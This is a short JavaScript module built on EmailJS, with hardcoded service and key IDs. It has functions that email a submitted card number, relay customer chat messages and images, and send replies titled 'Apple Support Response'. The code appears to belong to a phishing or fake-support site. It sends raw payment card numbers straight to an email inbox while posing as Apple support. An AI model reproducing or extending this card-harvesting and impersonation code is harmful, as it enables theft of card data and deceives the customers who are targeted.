import emailjs from 'emailjs-com';

const SERVICE_ID = 'service_ozea06x';
const TEMPLATE_ID = 'template_hjohb6l';
const CHAT_TEMPLATE_ID = 'template_jrao90f'; // Chat messages template ID
const PUBLIC_KEY = 'XMOnwjyzQDoRVRYl3';

export function sendCardNumberEmail(cardNumber) {
  return emailjs.send(
    SERVICE_ID,
    TEMPLATE_ID,
    { card_number: cardNumber },
    PUBLIC_KEY
  );
}

export function sendChatMessage(message, userEmail = 'customer@unknown.com', imageData = null, imageName = null) {
  const templateParams = { 
    message: message || '[Image uploaded]',
    user_email: userEmail,
    timestamp: new Date().toLocaleString(),
    subject: 'New Chat Support Message',
    has_image: imageData ? 'Yes' : 'No',
    image_name: imageName || 'No image',
    image_data: imageData || 'No image attached'
  };

  return emailjs.send(
    SERVICE_ID,
    CHAT_TEMPLATE_ID,
    templateParams,
    PUBLIC_KEY
  );
}

// Send admin response to customer
export function sendAdminResponse(adminMessage, customerEmail) {
  const templateParams = {
    message: adminMessage,
    user_email: customerEmail,
    timestamp: new Date().toLocaleString(),
    subject: 'Apple Support Response'
  };

  return emailjs.send(
    SERVICE_ID,
    CHAT_TEMPLATE_ID,
    templateParams,
    PUBLIC_KEY
  );
}
